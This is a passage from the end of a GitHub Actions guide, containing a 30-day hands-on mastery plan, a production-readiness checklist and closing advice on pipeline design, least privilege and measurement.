| **Workflow command** | A `::command::` line on stdout that the runner interprets |
| **Workflow run** | One execution of a workflow |

---

## Appendix G — A 30-Day Mastery Plan

A plan for someone who needs to be genuinely production-capable, not just familiar. Roughly 1–1.5 hours a day. **Build everything in a real repository** — reading is not enough.

### Week 1 — Foundations and the language

| Day | Read | Build |
|---|---|---|
| 1 | Ch 1–4 | Create a repo. Write a hello-world workflow. Read the run log and identify each phase from §4.1 |
| 2 | Ch 5–6 | Add `push`, `pull_request`, `workflow_dispatch` with three typed inputs, and a `schedule`. Observe which triggers use the default branch |
| 3 | Ch 7–8 | Matrix over two OSes and two JDKs. Deliberately break a step and observe skip behaviour. Add `if: always()` steps |
| 4 | Ch 9 | Dump `toJSON(github.event)` for four different events. Write five non-trivial `if:` conditions and verify each |
| 5 | Ch 10 | Pass data: step → step via `$GITHUB_OUTPUT`, job → job via outputs, and a file via an artifact. Write a real job summary with a table |
| 6 | Ch 11–12 | Build a five-job DAG. Add the `CI Gate` pattern. Build a dynamic matrix from an upstream job's JSON output |
| 7 | Ch 13 | Add concurrency to a PR workflow and watch a run get cancelled. Add a queued deploy group and watch one wait |

### Week 2 — Making it real

| Day | Read | Build |
|---|---|---|
| 8 | Ch 14 | Add dependency caching. Measure cold vs warm. Deliberately break the key and diagnose it. Try `cache-mode: read` |
| 9 | Ch 15 | Upload test reports on failure. Hit the matrix name collision on purpose, then fix it with `pattern:` + merge |
| 10 | Ch 16 | Integration tests two ways: `services:` and Testcontainers. Note the hostname difference for container jobs |
| 11 | Ch 17 | Set `permissions: {}` and watch things break. Add scopes back one at a time until it works |
| 12 | Ch 18 | Create `staging` and `production` environments. Add required reviewers. Watch a job wait for approval |
| 13 | Ch 19 | Set up OIDC to a cloud account. Write the trust policy against the `environment` claim. Delete every stored cloud key |
| 14 | — | **Consolidate:** build a complete PR gate for a real service. Target under 10 minutes |

### Week 3 — Composition and the catalogue

| Day | Read | Build |
|---|---|---|
| 15 | Ch 20–21 | Extract your setup steps into a composite action. Pin every third-party action to a SHA |
| 16 | Ch 22 | Convert your CI into a reusable workflow. Call it from a second repository |
| 17 | Ch 23–26 | Write a small JavaScript action end to end, including `dist/` and the staleness check |
| 18 | Ch 27–29 | Add coverage gating with a PR comment. Add a sharded E2E job |
| 19 | Ch 30–31 | Build and push a container image. Add Trivy, an SBOM, cosign signing and a provenance attestation |
| 20 | Ch 32–33 | Deploy to a real staging environment. Verify the rollout properly, not just `apply` succeeding |
| 21 | Ch 34, 37 | Add release automation. Build the ops runbook workflow and the rollback workflow |

### Week 4 — Production engineering

| Day | Read | Build |
|---|---|---|
| 22 | Ch 35–36 | Terraform plan-on-PR with a comment. Add drift detection |
| 23 | Ch 38–40 | Add labelling, a ChatOps command (with the permission check), and transition-only Slack notifications |
| 24 | Ch 41, 51 | Export run metrics. Build the weekly CI health report |
| 25 | Ch 48 | Audit your own workflows against the hardening checklist. Fix everything you find |
| 26 | Ch 49, 53 | Profile your pipeline. Cut the critical path by at least 30% |
| 27 | Ch 50, 52 | Add diagnostics capture. Add `actionlint` to the gate. Debug something with tmate |
| 28 | Ch 43–47 | Assemble the full reference architecture for one service, end to end |
| 29 | Ch 54–56 | Review everything against the anti-pattern list. Write down your team's standards |
| 30 | Ch 57 | **Break things deliberately** and practise diagnosing: wrong permissions, a failing cache, a skipped required check, a script injection you then fix |

### The competence checklist

You are production-ready when you can, without looking anything up:

- [ ] Explain why a job cannot see a file another job created
- [ ] Explain the difference between `pull_request` and `pull_request_target`, and why it matters
- [ ] Write a cache key that invalidates correctly, and diagnose one that does not
- [ ] Set up OIDC to a cloud provider and write a trust policy that cannot be abused by another branch
- [ ] Design an environment scheme with appropriate protection rules
- [ ] Build a dynamic matrix from change detection
- [ ] Explain why `if: always()` on a deploy job is a bug
- [ ] Spot a script injection in a code review
- [ ] Say what your pipeline's p95 duration is, and which step dominates it
- [ ] Roll back production in under two minutes, having practised it
- [ ] Explain the difference between a composite action and a reusable workflow, and pick correctly
- [ ] Debug a failing workflow without adding `echo` statements at random

---

## Closing notes

A few things worth carrying away.

**The pipeline is a product.** It has users (your team), a latency budget, an error budget, and an owner. Treat it that way and it stays good; treat it as plumbing and it degrades until people route around it.

**Build once, promote the digest.** If you remember one rule from this document, this is the one. Almost every "it worked in staging" incident traces back to violating it.

**Least privilege, everywhere.** Explicit `permissions:`, environment-scoped secrets, OIDC bound to environment claims, SHA-pinned actions, `cache-mode` on untrusted workflows. Each is cheap; together they close almost every realistic attack path.

**Workflows orchestrate, scripts implement.** Keep YAML thin. Put logic in files you can run and test on your laptop.

**Measure it.** You cannot reason about a pipeline you cannot see. Even a weekly report beats nothing.

The platform will keep moving — new runner images, new action majors, new security defaults. The concepts in Parts I–III change slowly; the specifics in Appendix E change monthly. Subscribe to the GitHub Changelog's `actions` label, and re-check versions before copying anything from a guide, including this one.
